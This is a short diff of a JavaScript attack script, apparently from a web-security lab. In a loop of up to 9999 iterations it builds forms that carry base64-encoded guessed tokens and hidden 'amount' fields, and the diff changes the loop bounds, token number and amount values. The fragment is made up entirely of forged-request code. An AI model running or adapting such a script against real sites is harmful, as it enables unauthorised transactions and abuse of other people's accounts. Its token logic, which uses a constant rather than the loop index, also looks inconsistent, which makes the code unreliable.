@@ -8,8 +8,8 @@
 let last = "MzU4Ng=="; 
 let base = parseInt(atob(last));
 
-for (let i = 1; i <= 5000; i++) {
-    let number = 6000;
+for (let i = 1; i <= 9999; i++) {
+    let number = 9999;
     let new_token = btoa(number.toString());
     
     let f = document.createElement('form');
@@ -35,7 +35,7 @@ for (let i = 1; i <= 5000; i++) {
     let amount = document.createElement('input');
     amount.type = 'hidden';
     amount.name = 'amount';
-    amount.value = '20';
+    amount.value = i;
     f.appendChild(amount);
     
     document.body.appendChild(f);
